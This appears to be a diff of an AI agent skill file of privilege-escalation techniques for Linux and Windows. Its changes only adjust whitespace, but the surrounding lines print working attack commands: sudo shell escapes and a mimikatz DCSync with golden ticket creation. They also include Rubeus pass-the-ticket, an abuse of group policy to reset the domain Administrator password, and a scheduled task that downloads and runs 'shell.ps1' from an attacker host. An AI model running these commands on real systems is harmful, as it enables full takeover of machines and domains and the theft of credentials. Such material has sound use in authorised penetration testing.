@@ -2,8 +2,8 @@
 name: Privilege Escalation Methods
 description: This skill should be used when the user asks to "escalate privileges", "get root access", "become administrator", "privesc techniques", "abuse sudo", "exploit SUID binaries", "Kerberoasting", "pass-the-ticket", "token impersonation", or needs guidance on post-exploitation privilege escalation for Linux or Windows systems.
 metadata:
-  author: zebbern
-  version: "1.1"
+ author: zebbern
+ version: "1.1"
 ---
 
 # Privilege Escalation Methods
@@ -47,8 +47,8 @@ sudo find /etc/passwd -exec /bin/bash \;
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 sudo perl -e 'exec "/bin/bash";'
-sudo less /etc/hosts    # then type: !bash
-sudo man man            # then type: !bash
+sudo less /etc/hosts # then type: !bash
+sudo man man # then type: !bash
 sudo env /bin/bash
 ```
 
@@ -151,9 +151,9 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 
 ```powershell
 .\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
-  --Author DOMAIN\<USER> --Command "cmd.exe" `
-  --Arguments "/c net user Administrator Password!@# /domain" `
-  --GPOName "ADDITIONAL DC CONFIGURATION"
+ --Author DOMAIN\<USER> --Command "cmd.exe" `
+ --Arguments "/c net user Administrator Password!@# /domain" `
+ --GPOName "ADDITIONAL DC CONFIGURATION"
 ```
 
 ---
@@ -184,14 +184,14 @@ mimikatz# lsadump::dcsync /user:krbtgt
 
 # Create golden ticket
 mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
-  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
+ /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
 ```
 
 #### 4. Pass-the-Ticket
 
 ```powershell
 .\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
-klist  # Verify ticket
+klist # Verify ticket
 ```
 
 #### 5. Golden Ticket with Scheduled Tasks
@@ -204,11 +204,11 @@ mimikatz# lsadump::lsa /patch
 
 # 2. Create golden ticket
 mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
-  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi
+ /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi
 
 # 3. Create scheduled task
 schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
-  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
+ /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
 schtasks /run /s DOMAIN /TN "enterprise"
 ```
 
@@ -292,7 +292,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 # Check sudo permissions
 $ sudo -l
 User www-data may run the following commands:
-    (root) NOPASSWD: /usr/bin/vim
+ (root) NOPASSWD: /usr/bin/vim
 
 # Exploit vim
 $ sudo vim -c ':!/bin/bash'
